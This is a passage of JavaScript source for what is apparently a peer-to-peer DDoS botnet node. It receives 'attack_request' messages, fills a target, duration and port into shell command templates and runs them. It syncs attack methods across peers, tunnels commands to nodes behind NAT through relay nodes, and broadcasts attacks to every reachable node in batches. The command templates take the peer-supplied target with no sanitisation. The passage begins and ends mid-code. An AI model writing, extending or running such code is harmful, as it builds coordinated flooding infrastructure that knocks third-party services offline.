          console.log(`[P2P] Connected to peer ${nodeId} at ${peerInfo.ip}:${normalizedPort} (our mode: ${this.nodeMode})`);
          finish({ success: true, direct: true }, true);
        });

        ws.on('error', (error) => {
          this.stats.connectionFailures++;
          console.log(`[P2P] Failed to connect to ${nodeId}: ${error.message}`);

          if (this.peers.has(nodeId)) {
            finish({ success: true, existing: true }, true);
            return;
          }

          maybeRetry(error.message);
        });
      });

    } catch (error) {
      this.connectionLocks.delete(nodeId);
      this.stats.connectionFailures++;
      console.error(`[P2P] Connection error to ${nodeId}:`, error.message);
      return { success: false, error: error.message };
    }
  }

  // ==========================================================
  // MESSAGE HANDLING
  // ==========================================================

  handlePeerMessage(nodeId, data) {
    try {
      const rawMessage = JSON.parse(data.toString());
      const decrypted = this.decryptMessage(rawMessage);

      if (!decrypted.success) {
        console.error(`[P2P] Failed to decrypt message from ${nodeId}:`, decrypted.error);
        return;
      }

      const message = decrypted.data;

      const peer = this.peers.get(nodeId);
      if (peer) {
        peer.lastSeen = Date.now();
        peer.messagesReceived++;
        if (decrypted.encrypted) {
          peer.encryptedMessages++;
        } else {
          peer.plainMessages++;
        }
      }

      this.stats.messagesReceived++;

      switch (message.type) {
        case 'connection_rejected':
          this.handleConnectionRejected(nodeId, message);
          break;
        case 'welcome':
          this.handleWelcomeMessage(nodeId, message);
          break;
        case 'ping': {
          const pongMessage = { type: 'pong', timestamp: Date.now() };
          const enc = this.encryptMessage(pongMessage, 'pong');
          this.sendToPeer(nodeId, enc.data);
          break;
        }
        case 'pong':
          if (peer) peer.lastHeartbeat = Date.now();
          break;
        case 'attack_request':
          this.handleAttackRequest(nodeId, message, decrypted.encrypted);
          break;
        case 'attack_response':
          this.emit('attack_response', { nodeId, ...message });
          break;
        case 'status_request':
          this.handleStatusRequest(nodeId, message, decrypted.encrypted);
          break;
        case 'status_response':
          this.emit('status_response', { nodeId, ...message });
          break;
        case 'peer_list':
          this.handlePeerListUpdate(message);
          break;

        // NEW: Tunnel messages — DIRECT node forwards to target REVERSE node
        case 'tunnel_request':
          this.handleTunnelRequest(nodeId, message, decrypted.encrypted);
          break;
        case 'tunnel_response':
          this.handleTunnelResponse(nodeId, message);
          break;
        case 'tunnel_delivery':
          // REVERSE node menerima pesan yang di-tunnel via DIRECT relay
          this.handleTunnelDelivery(nodeId, message);
          break;
        case 'peer_reverse_list':
          // DIRECT node memberitahu peers-nya siapa saja REVERSE yang terkoneksi
          this.handlePeerReverseList(nodeId, message);
          break;

        case 'relay_request':
          this.handleRelayRequest(nodeId, message, decrypted.encrypted);
          break;
        case 'relay_response':
          this.handleRelayResponse(nodeId, message);
          break;
        case 'methods_version_query':
          this.handleMethodsVersionQuery(nodeId, message, decrypted.encrypted);
          break;
        case 'methods_version_response':
          this.handleMethodsVersionResponse(nodeId, message);
          break;
        case 'methods_request':
          this.handleMethodsRequest(nodeId, message, decrypted.encrypted);
          break;
        case 'methods_response':
          this.handleMethodsResponse(nodeId, message);
          break;
        case 'methods_push':
          this.handleMethodsPush(nodeId, message);
          break;
        case 'methods_update_notification':
          this.handleMethodsUpdateNotification(nodeId, message);
          break;
        case 'file_request':
          this.handleFileRequest(nodeId, message, decrypted.encrypted);
          break;
        case 'file_response':
          this.handleFileResponse(nodeId, message);
          break;
        default:
          console.log(`[P2P] Unknown message type from ${nodeId}: ${message.type}`);
          this.emit('peer_message', { nodeId, message });
      }

    } catch (error) {
      console.error(`[P2P] Failed to handle message from ${nodeId}:`, error.message);
    }
  }

  // ==========================================================
  // NEW: TUNNEL SUPPORT
  // Enables DIRECT nodes to relay messages TO REVERSE nodes
  // and back. REVERSE node A -> DIRECT node B -> REVERSE node C
  // ==========================================================

  /**
   * Send a message to a target node via tunnel through a DIRECT peer.
   * Used when target is a REVERSE node that is connected to a DIRECT peer.
   */
  async sendViaTunnel(targetNodeId, message, messageType = 'tunnel_payload') {
    // Strategi relay:
    // 1. Cek knownReversePeers — kita tahu persis DIRECT mana yang punya si target
    // 2. Fallback: coba semua DIRECT peers kita (trial and error)
    const tunnelId = crypto.randomBytes(8).toString('hex');

    const tunnelRequest = {
      type: 'tunnel_request',
      tunnelId,
      targetNodeId,
      messageType,
      payload: message,
      sourceNodeId: this.nodeId,
      timestamp: Date.now()
    };

    // Strategi 1: kita tahu relay yang tepat
    const knownRelayId = this.knownReversePeers.get(targetNodeId);
    if (knownRelayId && this.peers.has(knownRelayId)) {
      console.log(`[P2P-TUNNEL] Sending to ${targetNodeId} via known relay ${knownRelayId}`);
      return this._requestWithHandler({
        nodeId: knownRelayId,
        requestId: tunnelId,
        eventName: 'tunnel_response',
        handlerKeyPrefix: 'tunnel_response',
        timeoutMs: 15000,
        matchField: 'tunnelId',
        message: tunnelRequest
      });
    }

    // Strategi 2: coba semua DIRECT peers secara paralel, ambil yang pertama berhasil
    const directPeers = Array.from(this.peers.entries())
      .filter(([, peer]) => peer.remoteMode === 'DIRECT' || (!peer.isReverseNode && peer.supportsTunnel !== false))
      .map(([nodeId]) => nodeId);

    if (directPeers.length === 0) {
      return { success: false, error: 'No DIRECT peer available for tunnel' };
    }

    console.log(`[P2P-TUNNEL] Trying ${directPeers.length} DIRECT peer(s) to reach ${targetNodeId}`);

    // Coba satu per satu (bukan paralel — hindari spam)
    for (const relayId of directPeers) {
      const result = await this._requestWithHandler({
        nodeId: relayId,
        requestId: crypto.randomBytes(8).toString('hex'),
        eventName: 'tunnel_response',
        handlerKeyPrefix: 'tunnel_response',
        timeoutMs: 8000,
        matchField: 'tunnelId',
        message: { ...tunnelRequest, tunnelId: crypto.randomBytes(8).toString('hex') }
      });

      if (result && result.success) {
        // Simpan untuk request berikutnya
        this.knownReversePeers.set(targetNodeId, relayId);
        console.log(`[P2P-TUNNEL] ✓ Found relay: ${relayId} for target ${targetNodeId}`);
        return result;
      }
    }

    return { success: false, error: `No relay found for ${targetNodeId} (tried ${directPeers.length} peers)` };
  }

  /**
   * Handle tunnel request: forward payload to target REVERSE node.
   * This runs on a DIRECT node acting as relay.
   */
  handleTunnelRequest(fromNodeId, message, wasEncrypted) {
    const { tunnelId, targetNodeId, payload, messageType, sourceNodeId } = message;

    console.log(`[P2P-TUNNEL] Tunnel request from ${fromNodeId} to ${targetNodeId} (id: ${tunnelId})`);

    // Check if we have the target REVERSE node connected
    const targetWs = this.reversePeers.get(targetNodeId);
    const targetPeer = this.peers.get(targetNodeId);

    if (!targetPeer || !targetWs) {
      // Target not found in our reverse pool
      const response = {
        type: 'tunnel_response',
        tunnelId,
        success: false,
        error: `Target node ${targetNodeId} not connected to this relay`
      };
      const enc = this.encryptMessage(response, 'tunnel_response');
      this.sendToPeer(fromNodeId, enc.data);
      return;
    }

    // Forward the payload to the target REVERSE node
    const forwardedMsg = {
      type: 'tunnel_delivery',
      tunnelId,
      sourceNodeId,
      relayNodeId: this.nodeId,
      messageType,
      payload,
      timestamp: Date.now()
    };

    const enc = this.encryptMessage(forwardedMsg, 'tunnel_delivery');
    const forwarded = this.sendToPeer(targetNodeId, enc.data);

    this.stats.tunnelMessagesForwarded++;

    // Acknowledge to sender
    const ackResponse = {
      type: 'tunnel_response',
      tunnelId,
      success: forwarded,
      targetNodeId,
      relayNodeId: this.nodeId,
      error: forwarded ? null : 'Failed to forward to target'
    };
    const encAck = this.encryptMessage(ackResponse, 'tunnel_response');
    this.sendToPeer(fromNodeId, encAck.data);

    console.log(`[P2P-TUNNEL] ${forwarded ? '✓' : '✗'} Forwarded tunnel message to ${targetNodeId}`);
  }

  handleTunnelResponse(nodeId, message) {
    this.emit('tunnel_response', { ...message });
  }

  /**
   * Dipanggil di REVERSE node saat menerima pesan yang di-tunnel via DIRECT.
   * Pesan ini di-dispatch seolah datang langsung dari sourceNodeId.
   */
  handleTunnelDelivery(fromRelayId, message) {
    const { tunnelId, sourceNodeId, messageType, payload } = message;

    console.log(`[P2P-TUNNEL] Received delivery from ${sourceNodeId} via relay ${fromRelayId} (type: ${messageType})`);

    if (!payload || !messageType) {
      console.warn('[P2P-TUNNEL] Invalid tunnel delivery — missing payload or messageType');
      return;
    }

    // Catat bahwa sourceNodeId bisa dicapai via fromRelayId (untuk balasan)
    this.knownReversePeers.set(sourceNodeId, fromRelayId);

    // Dispatch payload seolah datang langsung dari sourceNodeId
    // Ini memungkinkan attack_request, methods_request, dll bekerja transparan
    try {
      const fakeData = Buffer.from(JSON.stringify(payload));
      this.handlePeerMessage(sourceNodeId, fakeData);
    } catch (err) {
      console.error('[P2P-TUNNEL] Error dispatching tunnel delivery:', err.message);
    }
  }

  /**
   * DIRECT node broadcast daftar REVERSE node di pool-nya ke semua peers.
   * Ini memungkinkan REVERSE-A tahu bahwa REVERSE-B ada di DIRECT-X.
   */
  handlePeerReverseList(fromNodeId, message) {
    const { reverseNodeIds } = message;
    if (!Array.isArray(reverseNodeIds)) return;

    let newEntries = 0;
    for (const reverseId of reverseNodeIds) {
      if (reverseId === this.nodeId) continue;
      if (!this.knownReversePeers.has(reverseId)) {
        newEntries++;
      }
      // fromNodeId adalah DIRECT relay yang punya reverseId di pool-nya
      this.knownReversePeers.set(reverseId, fromNodeId);
    }

    if (newEntries > 0) {
      console.log(`[P2P-TUNNEL] Learned ${newEntries} new REVERSE peer route(s) via ${fromNodeId}`);
    }
  }

  /**
   * DIRECT node kirim daftar REVERSE peers-nya ke semua connected peers.
   * Dipanggil saat ada REVERSE node baru connect, atau periodik.
   */
  broadcastReverseList() {
    if (this.reversePeers.size === 0) return 0;

    const reverseNodeIds = Array.from(this.reversePeers.keys());
    const message = {
      type: 'peer_reverse_list',
      fromNodeId: this.nodeId,
      reverseNodeIds,
      timestamp: Date.now()
    };

    let sent = 0;
    for (const [peerId] of this.peers) {
      // Kirim ke semua peers (DIRECT dan REVERSE) kecuali yang ada di daftar itu sendiri
      if (!reverseNodeIds.includes(peerId)) {
        const enc = this.encryptMessage(message, 'peer_reverse_list');
        if (this.sendToPeer(peerId, enc.data)) sent++;
      }
    }

    this.stats.reverseListBroadcasts++;
    console.log(`[P2P-TUNNEL] Broadcasted reverse list (${reverseNodeIds.length} REVERSE node(s)) to ${sent} peer(s)`);
    return sent;
  }

  // ==========================================================
  // WELCOME MESSAGE HANDLER (upgraded for mode awareness)
  // ==========================================================

  handleWelcomeMessage(nodeId, message) {
    console.log(`[P2P] Received welcome from ${nodeId} (mode: ${message.mode || 'unknown'})`);

    const peer = this.peers.get(nodeId);
    if (peer) {
      peer.capabilities = message.capabilities;
      peer.remoteMode = message.mode || peer.remoteMode || 'DIRECT';

      if (message.capabilities?.encryption !== undefined) {
        peer.supportsEncryption = message.capabilities.encryption;
      }

      if (message.ip) peer.ip = message.ip;
      if (message.port) peer.port = this.normalizePort(message.port);

      if (message.capabilities) {
        peer.methodsVersion = message.capabilities.methodsVersion;
        peer.methodsCount = message.capabilities.methodsCount || 0;
        peer.supportsTunnel = message.capabilities.tunnel || false;   // NEW
      }

      const now = Date.now();
      this.knownPeers.set(nodeId, {
        nodeId,
        ip: message.ip || peer.ip,
        port: this.normalizePort(message.port || peer.port),
        mode: message.mode || 'DIRECT',
        reachable: message.mode !== 'REVERSE',
        canConnectTo: message.mode !== 'REVERSE',
        capabilities: message.capabilities,
        methodsVersion: message.capabilities?.methodsVersion,
        methodsCount: message.capabilities?.methodsCount || 0,
        lastUpdate: now,
        supportsEncryption: message.capabilities?.encryption || false
      });

      // NEW: If remote is DIRECT and we are REVERSE, mark this as a "relay provider"
      if (peer.remoteMode === 'DIRECT' && this.nodeMode === 'REVERSE') {
        peer.isRelayProvider = true;
        this.stats.reverseHandshakes++;
        console.log(`[P2P] ✓ Established REVERSE→DIRECT link with ${nodeId} (relay provider)`);
      }

      if (this.p2pConfig.preferP2PSync && peer.methodsVersion &&
        peer.methodsVersion !== this.methodsVersionHash) {
        setTimeout(() => this.requestMethodsVersionFromPeer(nodeId), 1000);
      }
    }

    this.emit('peer_info', {
      nodeId,
      capabilities: message.capabilities,
      mode: message.mode
    });
  }

  // ==========================================================
  // ATTACK HANDLING
  // ==========================================================

  async handleAttackRequest(nodeId, message, wasEncrypted) {
    const { requestId, target, time, port, methods } = message;

    console.log(`[P2P] Attack request from ${nodeId}:`, { target, time, methods });

    try {
      const methodCfg = this.methodsConfig[methods];
      if (!methodCfg) {
        const response = { type: 'attack_response', requestId, success: false, error: 'INVALID_METHOD' };
        const enc = this.encryptMessage(response, 'attack_response');
        this.sendToPeer(nodeId, enc.data);
        return;
      }

      const command = methodCfg.cmd
        .replaceAll('{target}', target)
        .replaceAll('{time}', time)
        .replaceAll('{port}', port);

      const result = await this.executor.execute(command, { expectedDuration: time });

      const response = {
        type: 'attack_response',
        requestId,
        success: true,
        processId: result.processId,
        pid: result.pid,
        target, time, port, methods
      };
      const enc = this.encryptMessage(response, 'attack_response');
      this.sendToPeer(nodeId, enc.data);

    } catch (error) {
      const response = { type: 'attack_response', requestId, success: false, error: error.message };
      const enc = this.encryptMessage(response, 'attack_response');
      this.sendToPeer(nodeId, enc.data);
    }
  }

  async handleStatusRequest(nodeId, message, wasEncrypted) {
    const { requestId } = message;
    try {
      const activeProcesses = this.executor.getActiveProcesses();
      const methods = Object.keys(this.methodsConfig);

      const status = {
        nodeId: this.nodeId,
        mode: this.nodeMode,
        activeProcesses: activeProcesses.length,
        methods,
        methodsVersion: this.methodsVersionHash,
        methodsCount: methods.length,
        peers: this.peers.size,
        reversePeers: this.reversePeers.size,
        uptime: process.uptime(),
        timestamp: Date.now(),
        encryption: this.isEncryptionEnabled()
      };

      const response = { type: 'status_response', requestId, status };
      const enc = this.encryptMessage(response, 'status_response');
      this.sendToPeer(nodeId, enc.data);

    } catch (error) {
      const response = { type: 'status_response', requestId, error: error.message };
      const enc = this.encryptMessage(response, 'status_response');
      this.sendToPeer(nodeId, enc.data);
    }
  }

  // ==========================================================
  // RELAY (legacy, kept for backward compat)
  // ==========================================================

  async handleRelayRequest(nodeId, message, wasEncrypted) {
    const { relayId, targetNodeId, payload } = message;

    if (this.peers.has(targetNodeId)) {
      const relayedMessage = { type: 'relayed_message', sourceNodeId: nodeId, relayId, payload };
      const enc = this.encryptMessage(relayedMessage, 'relayed_message');
      const success = this.sendToPeer(targetNodeId, enc.data);

      const response = { type: 'relay_response', relayId, success, targetNodeId };
      const encResp = this.encryptMessage(response, 'relay_response');
      this.sendToPeer(nodeId, encResp.data);

      if (success) this.stats.messagesRelayed++;

    } else {
      const response = { type: 'relay_response', relayId, success: false, error: 'Target not connected', targetNodeId };
      const enc = this.encryptMessage(response, 'relay_response');
      this.sendToPeer(nodeId, enc.data);
    }
  }

  handleRelayResponse(nodeId, message) {
    this.emit('relay_response', { relayNodeId: nodeId, ...message });
  }

  // ==========================================================
  // PEER LIST UPDATE
  // ==========================================================

  handlePeerListUpdate(message) {
    const { peers } = message;
    if (!Array.isArray(peers)) return;

    let newPeers = 0;
    const now = Date.now();

    for (const peer of peers) {
      if (!peer.node_id || peer.node_id === this.nodeId) continue;

      const normalizedPort = this.normalizePort(peer.port);
      if (peer.ip === this.nodeIp && normalizedPort === this.nodePort) continue;

      const peerMode = peer.mode || 'DIRECT';
      const existing = this.knownPeers.get(peer.node_id);
      if (!existing) {
        newPeers++;
        this.stats.peersDiscovered++;
      }

      this.knownPeers.set(peer.node_id, {
        nodeId: peer.node_id,
        ip: peer.ip,
        port: normalizedPort,
        mode: peerMode,
        reachable: peer.reachable !== false && peerMode !== 'REVERSE',
        canConnectTo: peerMode !== 'REVERSE',
        methods: peer.methods_supported || [],
        methodsVersion: peer.methods_version,
        methodsCount: peer.methods_count || 0,
        lastUpdate: now
      });
    }

    if (newPeers > 0) {
      console.log(`[P2P-DISCOVERY] Updated: ${newPeers} new peers`);
    }
  }

  // ==========================================================
  // CONNECTION REJECTED HANDLER
  // ==========================================================

  handleConnectionRejected(nodeId, message) {
    const { reason, referrals } = message;
    console.log(`[P2P-REFERRAL] Connection to ${nodeId} rejected: ${reason}`);

    if (!referrals || referrals.length === 0) return;

    this.stats.referralsReceived++;

    const now = Date.now();
    for (const referral of referrals) {
      if (referral.nodeId === this.nodeId) continue;
      if (referral.mode === 'REVERSE') continue; // Skip REVERSE nodes in referrals

      const existing = this.knownPeers.get(referral.nodeId);
      if (!existing || existing.lastUpdate < now - 60000) {
        this.knownPeers.set(referral.nodeId, {
          nodeId: referral.nodeId,
          ip: referral.ip,
          port: this.normalizePort(referral.port),
          mode: referral.mode || 'DIRECT',
          reachable: referral.mode !== 'REVERSE',
          canConnectTo: referral.mode !== 'REVERSE',
          capabilities: null,
          methodsVersion: null,
          methodsCount: referral.methodsCount || 0,
          lastUpdate: now,
          fromReferral: true,
          referredBy: nodeId
        });
      }
    }

    if (this.p2pConfig.autoConnect && this.peers.size < this.p2pConfig.maxPeers) {
      setTimeout(() => this.connectToReferralPeers(referrals), 2000);
    }
  }

  async connectToReferralPeers(referrals) {
    if (!referrals || referrals.length === 0) return;

    const availableSlots = this.p2pConfig.maxPeers - this.peers.size - this.connectionLocks.size;
    if (availableSlots <= 0) return;

    let connected = 0;
    for (const referral of referrals) {
      if (connected >= availableSlots) break;
      if (this.peers.has(referral.nodeId) || referral.nodeId === this.nodeId) continue;
      if (this.connectionLocks.has(referral.nodeId)) continue;
      if (referral.mode === 'REVERSE') continue; // Cannot connect to REVERSE

      try {
        const result = await this.connectToPeer(referral.nodeId, {
          ip: referral.ip,
          port: referral.port,
          mode: referral.mode || 'DIRECT',
          canConnectTo: true
        });

        if (result.success) {
          connected++;
          this.stats.connectionsViaReferral++;
        }
        await new Promise(r => setTimeout(r, 1000));
      } catch (error) {
        console.error(`[P2P-REFERRAL] Error connecting to ${referral.nodeId}:`, error.message);
      }
    }
  }

  // ==========================================================
  // METHODS SYNC
  // ==========================================================

  handleMethodsVersionQuery(nodeId, message, wasEncrypted) {
    const { requestId } = message;
    const response = {
      type: 'methods_version_response',
      requestId,
      nodeId: this.nodeId,
      methodsVersion: this.methodsVersionHash,
      methodsCount: Object.keys(this.methodsConfig).length,
      lastUpdate: this.methodsLastUpdate,
      timestamp: Date.now()
    };
    const enc = this.encryptMessage(response, 'methods_version_response');
    this.sendToPeer(nodeId, enc.data);
  }

  handleMethodsVersionResponse(nodeId, message) {
    const { requestId, methodsVersion, methodsCount, lastUpdate } = message;

    const peer = this.peers.get(nodeId);
    if (peer) {
      peer.methodsVersion = methodsVersion;
      peer.methodsCount = methodsCount;
    }

    const kp = this.knownPeers.get(nodeId);
    if (kp) {
      this.knownPeers.set(nodeId, { ...kp, methodsVersion, methodsCount, lastUpdate: Date.now() });
    }

    if (methodsVersion && methodsVersion !== this.methodsVersionHash) {
      const localCount = Object.keys(this.methodsConfig).length;
      if (methodsCount > localCount || (lastUpdate && lastUpdate > this.methodsLastUpdate)) {
        console.log(`[P2P-METHODS] Peer ${nodeId} has newer methods, requesting...`);
        this.requestMethodsFromPeer(nodeId);
      }
    }

    this.emit('methods_version_response', { nodeId, requestId, methodsVersion, methodsCount, lastUpdate });
  }

  handleMethodsRequest(nodeId, message, wasEncrypted) {
    const { requestId } = message;
    const response = {
      type: 'methods_response',
      requestId,
      nodeId: this.nodeId,
      methods: this.methodsConfig,
      methodsVersion: this.methodsVersionHash,
      methodsCount: Object.keys(this.methodsConfig).length,
      timestamp: Date.now()
    };
    const enc = this.encryptMessage(response, 'methods_response');
    this.sendToPeer(nodeId, enc.data);
    this.stats.filesShared++;
  }

  async handleMethodsResponse(nodeId, message) {
    const { requestId, methods, methodsVersion, methodsCount } = message;

    if (!methods || typeof methods !== 'object') return;

    try {
      const keys = Object.keys(methods).sort();
      const normalized = JSON.stringify(methods, keys);
      const calculatedHash = crypto.createHash('sha256').update(normalized).digest('hex');

      if (calculatedHash !== methodsVersion) {
        console.error('[P2P-METHODS] Methods version mismatch, rejecting');
        return;
      }

      const normalizedMethods = normalizeMethodsToLocalPaths(methods, this.config);
      if (!normalizedMethods || Object.keys(normalizedMethods).length === 0) return;

      this.methodsConfig = normalizedMethods;
      this.methodsVersionHash = methodsVersion;
      this.methodsLastUpdate = Date.now();
      this.stats.lastMethodSync = Date.now();

      const peer = this.peers.get(nodeId);
      if (peer) { peer.methodsVersion = methodsVersion; peer.methodsCount = methodsCount; }

      const kp = this.knownPeers.get(nodeId);
      if (kp) this.knownPeers.set(nodeId, { ...kp, methodsVersion, methodsCount, lastUpdate: Date.now() });

      console.log(`[P2P-METHODS] ✓ Updated methods from peer ${nodeId}`);
      this.stats.methodSyncsFromPeers++;

      this.emit('methods_updated_from_peer', { nodeId, methods: normalizedMethods, methodsVersion, methodsCount, source: 'request_response' });

      setImmediate(() => this.propagateMethodsUpdateImmediate(nodeId, methodsVersion, [nodeId]));

    } catch (error) {
      console.error('[P2P-METHODS] Error processing methods from peer:', error.message);
    }
  }

  handleMethodsPush(nodeId, message) {
    const { methods, methodsVersion, methodsCount, propagationChain } = message;

    if (Array.isArray(propagationChain)) {
      if (propagationChain.includes(this.nodeId)) return;
      if (propagationChain.length >= this.p2pConfig.maxPropagationHops) return;
    }

    if (!methods || typeof methods !== 'object') return;

    try {
      const keys = Object.keys(methods).sort();
      const normalized = JSON.stringify(methods, keys);
      const calculatedHash = crypto.createHash('sha256').update(normalized).digest('hex');

      if (calculatedHash !== methodsVersion) return;
      if (methodsVersion === this.methodsVersionHash) return;

      const normalizedMethods = normalizeMethodsToLocalPaths(methods, this.config);
      if (!normalizedMethods || Object.keys(normalizedMethods).length === 0) return;

      this.methodsConfig = normalizedMethods;
      this.methodsVersionHash = methodsVersion;
      this.methodsLastUpdate = Date.now();
      this.stats.lastMethodSync = Date.now();

      const peer = this.peers.get(nodeId);
      if (peer) { peer.methodsVersion = methodsVersion; peer.methodsCount = methodsCount; }

      const kp = this.knownPeers.get(nodeId);
      if (kp) this.knownPeers.set(nodeId, { ...kp, methodsVersion, methodsCount, lastUpdate: Date.now() });

      console.log(`[P2P-METHODS] ✓ Updated methods from push by ${nodeId}`);
      this.stats.methodSyncsFromPeers++;

      this.emit('methods_updated_from_peer', { nodeId, methods: normalizedMethods, methodsVersion, methodsCount, source: 'proactive_push' });

      const newChain = propagationChain ? [...propagationChain, this.nodeId] : [nodeId, this.nodeId];
      setImmediate(() => this.propagateMethodsUpdateImmediate(nodeId, methodsVersion, newChain));

    } catch (error) {
      console.error('[P2P-METHODS] Error processing methods push:', error.message);
    }
  }

  handleMethodsUpdateNotification(nodeId, message) {
    const { methodsVersion, methodsCount, propagationChain } = message;

    if (Array.isArray(propagationChain) && propagationChain.includes(this.nodeId)) return;
    if (this.methodUpdatePropagationLock.has(methodsVersion)) return;

    this.methodUpdatePropagationLock.set(methodsVersion, Date.now());
    setTimeout(() => this.methodUpdatePropagationLock.delete(methodsVersion), this.p2pConfig.propagationCooldown);

    if (methodsVersion && methodsVersion !== this.methodsVersionHash) {
      console.log(`[P2P-METHODS] New version detected, requesting from ${nodeId}...`);

      this.requestMethodsFromPeer(nodeId).then(result => {
        if (result && result.success !== false) {
          const newChain = propagationChain ? [...propagationChain, this.nodeId] : [nodeId, this.nodeId];
          this.propagateMethodsUpdateImmediate(nodeId, methodsVersion, newChain);
        }
      }).catch(err => {
        console.error('[P2P-METHODS] Failed to sync from peer:', err.message);
      });
    }
  }

  // ==========================================================
  // FILE HANDLING
  // ==========================================================

  handleFileRequest(nodeId, message, wasEncrypted) {
    const { requestId, filename } = message;

    const dataDir = path.join(__dirname, '..', 'lib', 'data');
    const filePath = path.join(dataDir, filename);

    const normalizedPath = path.normalize(filePath);
    const normalizedDataDir = path.normalize(dataDir);
    if (!normalizedPath.startsWith(normalizedDataDir)) {
      const response = { type: 'file_response', requestId, filename, success: false, error: 'Invalid filename' };
      const enc = this.encryptMessage(response, 'file_response');
      this.sendToPeer(nodeId, enc.data);
      return;
    }

    if (!fs.existsSync(normalizedPath)) {
      const response = { type: 'file_response', requestId, filename, success: false, error: 'File not found' };
      const enc = this.encryptMessage(response, 'file_response');
      this.sendToPeer(nodeId, enc.data);
      return;
    }

    try {
      const fileData = fs.readFileSync(normalizedPath);
      const base64Data = fileData.toString('base64');
      const response = { type: 'file_response', requestId, filename, data: base64Data, size: fileData.length, success: true };
      const enc = this.encryptMessage(response, 'file_response');
      this.sendToPeer(nodeId, enc.data);
      this.stats.filesShared++;
    } catch (error) {
      const response = { type: 'file_response', requestId, filename, success: false, error: error.message };
      const enc = this.encryptMessage(response, 'file_response');
      this.sendToPeer(nodeId, enc.data);
    }
  }

  handleFileResponse(nodeId, message) {
    const { requestId, filename, data, success, error } = message;
    if (success && data) {
      this.emit('file_received', { nodeId, requestId, filename, data, size: message.size });
      this.stats.filesReceived++;
    } else {
      console.error(`[P2P-FILE] Failed to receive ${filename}: ${error}`);
    }
  }

  // ==========================================================
  // REQUEST/RESPONSE HELPERS
  // ==========================================================

  async requestMethodsVersionFromPeer(nodeId) {
    const requestId = crypto.randomBytes(8).toString('hex');
    return this._requestWithHandler({
      nodeId, requestId,
      eventName: 'methods_version_response',
      handlerKeyPrefix: 'methods_version_response',
      timeoutMs: 10000,
      message: { type: 'methods_version_query', requestId, timestamp: Date.now() }
    });
  }

  async requestMethodsFromPeer(nodeId) {
    const requestId = crypto.randomBytes(8).toString('hex');
    return this._requestWithHandler({
      nodeId, requestId,
      eventName: 'methods_response',
      handlerKeyPrefix: 'methods_response',
      timeoutMs: 30000,
      message: { type: 'methods_request', requestId, timestamp: Date.now() }
    });
  }

  async requestFileFromPeer(nodeId, filename) {
    const requestId = crypto.randomBytes(8).toString('hex');
    return this._requestWithHandler({
      nodeId, requestId,
      eventName: 'file_received',
      handlerKeyPrefix: 'file_received',
      timeoutMs: 60000,
      message: { type: 'file_request', requestId, filename, timestamp: Date.now() }
    });
  }

  async requestAttackFromPeer(nodeId, target, time, port, methods) {
    const requestId = crypto.randomBytes(8).toString('hex');
    return this._requestWithHandler({
      nodeId, requestId,
      eventName: 'attack_response',
      handlerKeyPrefix: 'attack_response',
      timeoutMs: 30000,
      message: { type: 'attack_request', requestId, target, time, port, methods }
    });
  }

  async requestStatusFromPeer(nodeId) {
    const requestId = crypto.randomBytes(8).toString('hex');
    return this._requestWithHandler({
      nodeId, requestId,
      eventName: 'status_response',
      handlerKeyPrefix: 'status_response',
      timeoutMs: 10000,
      message: { type: 'status_request', requestId }
    });
  }

  _requestWithHandler({ nodeId, requestId, eventName, handlerKeyPrefix, timeoutMs, message, matchField = 'requestId' }) {
    return new Promise((resolve) => {
      let timeoutId = null;
      const handlerKey = `${handlerKeyPrefix}_${requestId}`;

      const cleanup = () => {
        if (timeoutId) { clearTimeout(timeoutId); timeoutId = null; }
        const stored = this.requestHandlers.get(handlerKey);
        if (stored) {
          this.removeListener(eventName, stored.handler);
          this.requestHandlers.delete(handlerKey);
          this.requestHandlerTimestamps.delete(handlerKey);
          this.stats.requestHandlersCleaned++;
        }
      };

      const handler = (data) => {
        if (data[matchField] === requestId) {
          cleanup();
          resolve(data);
        }
      };

      this.requestHandlers.set(handlerKey, { eventName, handler });
      this.requestHandlerTimestamps.set(handlerKey, Date.now());
      this.on(eventName, handler);

      timeoutId = setTimeout(() => {
        cleanup();
        resolve({ success: false, error: 'Timeout' });
      }, timeoutMs);

      const encrypted = this.encryptMessage(message, message.type);
      const sent = this.sendToPeer(nodeId, encrypted.data);
      if (!sent) {
        cleanup();
        resolve({ success: false, error: 'Failed to send request' });
      }
    });
  }

  // ==========================================================
  // BROADCAST ATTACK (upgraded: includes REVERSE nodes via tunnel)
  // ==========================================================

  async broadcastAttackRequest({ target, time, port, methods, targetPeerIds = null, maxParallel = 5 }) {
    // Kumpulkan semua target:
    // 1. Direct peers (connected langsung)
    // 2. REVERSE nodes yang kita tahu via knownReversePeers (tunnel)
    // 3. REVERSE nodes di pool kita sendiri (jika kita DIRECT)

    const directTargets = new Set();   // nodeId yang bisa di-request langsung
    const tunnelTargets = new Map();   // nodeId -> relayNodeId (via tunnel)

    if (Array.isArray(targetPeerIds) && targetPeerIds.length > 0) {
      for (const id of targetPeerIds) {
        if (this.peers.has(id)) directTargets.add(id);
        else if (this.knownReversePeers.has(id)) tunnelTargets.set(id, this.knownReversePeers.get(id));
      }
    } else {
      // Semua direct peers
      for (const [nodeId] of this.peers) {
        directTargets.add(nodeId);
      }
      // Semua REVERSE nodes yang kita tahu route-nya (tapi belum direct)
      for (const [reverseId, relayId] of this.knownReversePeers) {
        if (!directTargets.has(reverseId) && this.peers.has(relayId)) {
          tunnelTargets.set(reverseId, relayId);
        }
      }
    }

    const totalTargets = directTargets.size + tunnelTargets.size;
    if (totalTargets === 0) {
      return { success: false, error: 'No peers connected', summary: { totalTargets: 0, success: 0, failed: 0 }, results: [] };
    }

    console.log(
      `[P2P-ATTACK-BROADCAST] Broadcasting to ${directTargets.size} direct + ${tunnelTargets.size} tunnel target(s)`
    );
    this.stats.broadcastAttacksSent++;

    const results = [];
    let successCount = 0;
    let failedCount = 0;

    // ── Direct peers ──────────────────────────────────────────
    const directList = Array.from(directTargets);
    for (let i = 0; i < directList.length; i += maxParallel) {
      const batch = directList.slice(i, i + maxParallel);
      const batchResults = await Promise.all(
        batch.map(async (nodeId) => {
          try {
            const res = await this.requestAttackFromPeer(nodeId, target, time, port, methods);
            if (res?.success) { successCount++; }
            else { failedCount++; this.stats.broadcastAttacksFailed++; }
            return { nodeId, via: 'direct', success: !!res?.success, error: res?.error || null };
          } catch (err) {
            failedCount++; this.stats.broadcastAttacksFailed++;
            return { nodeId, via: 'direct', success: false, error: err.message };
          }
        })
      );
      results.push(...batchResults);
    }

    // ── Tunnel targets (REVERSE nodes via DIRECT relay) ───────
    if (tunnelTargets.size > 0) {
      const tunnelList = Array.from(tunnelTargets.entries());
